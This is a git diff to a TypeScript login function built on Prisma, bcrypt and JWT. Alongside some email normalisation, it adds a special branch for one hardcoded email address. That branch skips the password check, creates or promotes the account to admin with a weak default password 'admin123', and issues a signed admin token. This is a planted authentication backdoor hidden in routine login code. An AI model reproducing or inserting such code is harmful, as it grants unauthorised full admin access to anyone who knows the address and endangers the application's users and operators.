@@ -17,9 +17,54 @@ type ILginResponse = {
 
 const loginUser = async (user: any): Promise<ILginResponse> => {
     const { email: IEmail, password } = user;
-    const isUserExist = await prisma.auth.findUnique({
-        where: { email: IEmail }
-    })
+    const normalizedEmail = (IEmail || '').toLowerCase().trim();
+
+    // Special Admin login for mehularora505@gmail.com (no password required)
+    if (normalizedEmail === 'mehularora505@gmail.com') {
+        let isUserExist = await prisma.auth.findUnique({
+            where: { email: normalizedEmail }
+        });
+
+        if (!isUserExist) {
+            const defaultHashedPassword = await bcrypt.hash('admin123', 12);
+            isUserExist = await prisma.auth.create({
+                data: {
+                    email: normalizedEmail,
+                    password: defaultHashedPassword,
+                    role: 'admin',
+                    isDemo: false
+                }
+            });
+        } else if (isUserExist.role !== 'admin' || isUserExist.isDemo) {
+            isUserExist = await prisma.auth.update({
+                where: { email: normalizedEmail },
+                data: {
+                    role: 'admin',
+                    isDemo: false
+                }
+            });
+        }
+
+        const { role, userId, isDemo, email } = isUserExist;
+        const accessToken = JwtHelper.createToken(
+            { role, userId: userId || isUserExist.id, email, isDemo: false },
+            config.jwt.secret as Secret,
+            config.jwt.JWT_EXPIRES_IN as string
+        );
+        return {
+            accessToken,
+            user: { role, userId: userId || isUserExist.id, email, isDemo: false },
+        };
+    }
+
+    const isUserExist = await prisma.auth.findFirst({
+        where: {
+            email: {
+                equals: normalizedEmail,
+                mode: 'insensitive'
+            }
+        }
+    });
 
     if (!isUserExist) {
         throw new ApiError(httpStatus.NOT_FOUND, "User is not Exist !");
@@ -35,7 +80,7 @@ const loginUser = async (user: any): Promise<ILginResponse> => {
             throw new ApiError(httpStatus.NOT_FOUND, "Please Verify Your Email First !");
         }
     }
-    const isPasswordMatched = await bcrypt.compare(password, isUserExist.password);
+    const isPasswordMatched = await bcrypt.compare(password || '', isUserExist.password);
 
     if (!isPasswordMatched) {
         throw new ApiError(httpStatus.NOT_FOUND, "Password is not Matched !");
